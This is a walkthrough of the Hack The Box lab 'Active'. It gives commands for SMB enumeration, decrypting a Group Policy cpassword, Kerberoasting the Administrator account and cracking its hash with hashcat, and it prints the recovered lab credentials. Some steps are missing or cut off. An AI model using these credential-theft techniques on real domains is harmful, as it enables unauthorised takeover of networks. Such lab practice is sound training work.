## **Step 1: Setting Up Our Environment**

First, we need to create a clean folder to work in and start recording everything we do.

Creating a new folder and starting a "script" that will record all our commands and outputs.

```bash

# Move into that folder
cd Active

# Start recording everything we type and see (this creates a file called "typescript")
```

## **Step 2: Scanning the Target Computer**

Now we need to find out what services (doors) are open on the target computer so we know how to get in.

### **What we're doing:**
Running a network scanner called `nmap` to see what's open on the target IP address (10.129.1.22).

### **Commands:**
```bash
# -sS = Stealth scan, -C = Run default scripts, -V = Show version info
# -oA Full_nmap = Save output in all formats with the name "Full_nmap"
# -T4 = Faster scanning speed
sudo nmap -sSCV 10.129.1.22 -oA Full_nmap -T4
```

### **What we found:**
The scan shows many open ports:
- **53 (DNS)** - Domain Name Service
- **88 (Kerberos)** - Authentication service
- **135, 139, 445 (SMB)** - File sharing
- **389 (LDAP)** - Directory service (like a phone book for the network)
- **636, 3268, 3269 (LDAP over SSL)** - Secure directory service

### **Important finding:**
We can see the domain name is **active.htb** - this is like the company name for this network.

### **Tags:** #Nmap #Scanning #Reconnaissance #PortScanning #ActiveDirectory #Kerberos #SMB #LDAP #DNS

## **Step 3: Exploring Shared Folders**

Now we'll try to see what files and folders are shared on the target computer. Think of it like looking at public folders on someone's computer.

### **What we're doing:**
Using tools to see what SMB (file sharing) shares are available.

### **Commands:**
```bash
# First, let's use enum4linux to gather information
enum4linux -a 10.129.1.22

# Next, use smbmap to see what shares we can access
smbmap -H 10.129.1.22
```

### **What we found:**
We can see several shares, but one stands out - **Replication** has "READ ONLY" permissions. This means we can see its contents!

```
Replication    READ ONLY
```

### **Tags:** #Enum4Linux #Smbmap #SMB #Enumeration #FileShares #Reconnaissance

## **Step 4: Connecting to the Replication Share**

Let's connect to that Replication share and see what's inside.

### **What we're doing:**
Connecting to the share using `smbclient` (like File Explorer but in the terminal).

### **Commands:**
```bash
# Connect to the Replication share with a blank username and password
smbclient //10.129.1.22/Replication -U ""%""

# Once connected, let's look around
smb: \> ls
```

### **What we found:**
We see a folder called `active.htb` - let's go inside it.

```bash
# Navigate into the folder
smb: \> cd active.htb

# Look at what's inside
smb: \active.htb\> ls
```

### **We found three important folders:**
- **DfsrPrivate** - Internal system folder (probably not interesting)
- **Policies** - This looks important! It contains Group Policy settings
- **scripts** - Might contain useful scripts

### **Tags:** #Smbclient #SMB #Enumeration #FileShares #GroupPolicy

## **Step 5: Downloading Everything**

Since we have access, let's download all the files from this share to our local machine.

### **What we're doing:**
Using `smbclient` to recursively download everything.

### **Commands:**
```bash
# Connect again, but this time we'll set it up to download everything
smbclient //10.129.1.22/Replication -U ""%""

# Turn on recursive mode (download folders inside folders)
smb: \> recurse on

# Turn off prompts (so we don't have to say yes to every file)
smb: \> prompt off

# Move into the active.htb folder
smb: \> cd active.htb

# Download everything (mget * means "get multiple files, all of them")
smb: \active.htb\> mget *
```

![[Pasted image 20260629140630.png]]

After this, exit the smbclient by typing `exit`.

### **Check what we downloaded:**
```bash
# Look at what files we now have
ls
```

We should see folders like `Policies`, `scripts`, and `DfsrPrivate`.

## **Step 6: Finding the Hidden Password**

Now the treasure hunt begins! Group Policy files sometimes contain hidden passwords that were accidentally left there by system administrators.

### **What we're doing:**
Looking through the Policy files for a Groups.xml file, which often contains passwords.

### **Commands:**
```bash
# Navigate to the Groups folder inside the policy
cd Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups

# Look at what's in this folder
ls

# Read the Groups.xml file
cat Groups.xml
```

### **What we found:**
The Groups.xml file contains a user account called `SVC_TGS` with a password that looks like gibberish - but it's actually encrypted!

![[Pasted image 20260629140808.png]]

```
<Properties action="U" newName="" fullName="" description="" 
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" .../>
```

### **Decrypting the Password:**
Microsoft had a big security oopsie - they used the same encryption key for all Group Policy passwords. We can easily decrypt it!

```bash
# Use the gpp-decrypt tool that comes with Kali
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

### **Success!**
The password is: **GPPstillStandingStrong2k18**

## **Step 7: Using the Found Password**

Now we have credentials (username and password) for a domain account:
- **Username:** SVC_TGS
- **Password:** GPPstillStandingStrong2k18

Let's see what access this account has.

Using `netexec` (a hacking tool) to check what shares we can access.

### **Commands:**

```bash
smb: \> cd SVC_TGS
```

The user flag should look something like: `acedca3a4f073ef5baf04206668b6e37`

## **Step 9: Gathering More Information with BloodHound**

BloodHound is a tool that maps out the Active Directory network and shows how users and computers are connected. It helps us find ways to get more access.

### **What we're doing:**
Running BloodHound to collect data about the network.

### **Commands:**
```bash
# Run BloodHound to collect all data about the domain
bloodhound-python -c All -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' -d active.htb -ns 10.129.1.22 -c all --zip
```

### **What this does:**
It creates a ZIP file with lots of JSON files that you can import into the BloodHound GUI (a visual tool) to see the network map.

## **Step 10: Stealing Administrator's Ticket (Kerberoasting)**

Kerberoasting is a technique where we request a special authentication ticket for the Administrator account, then crack it offline.

### **What we're doing:**
Using impacket-GetUserSPNs to request the Administrator's Kerberos ticket.

### **Commands:**
```bash
# Request the Administrator's TGS ticket
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.1.22 -request
```

![[Pasted image 20260629141222.png]]

### **What we got:**
We received a long string of text - that's the encrypted ticket for the Administrator account. We'll save it to a file so we can crack it.

```bash
# Save the hash to a file (copy and paste the hash into a file called hash.txt)
echo 'PASTE_THE_HASH_HERE' > hash.txt
```

### **Tags:** #Kerberoasting #Impacket #GetUserSPNs #Kerberos #TGS #Credentials #ActiveDirectory

## **Step 11: Cracking the Administrator Password**

Now we'll use a password cracking tool called Hashcat to try millions of passwords against the hash we stole.

### **What we're doing:**
Using Hashcat to crack the Kerberos hash.

### **Commands:**
```bash
# Crack the hash using the rockyou wordlist
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

### **What the command means:**
- `-m 13100` = The hash type (Kerberos 5 TGS)
- `hash.txt` = Our hash file
- `/usr/share/wordlists/rockyou.txt` = A big list of common passwords

![[Pasted image 20260629141351.png]]
![[Pasted image 20260629141422.png]]
### **Hashcat found the password!**
**Administrator's password is: Ticketmaster1968**

We can also use John the Ripper to verify:
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Now we have the Administrator password. We can use it to get full control of the machine.

Using `netexec` to check if our credentials work.

3. **Limit service account permissions** - SVC_TGS had too much access - #LeastPrivilege
4. **Regularly audit passwords** - Check for weak ones in your domain - #PasswordAuditing
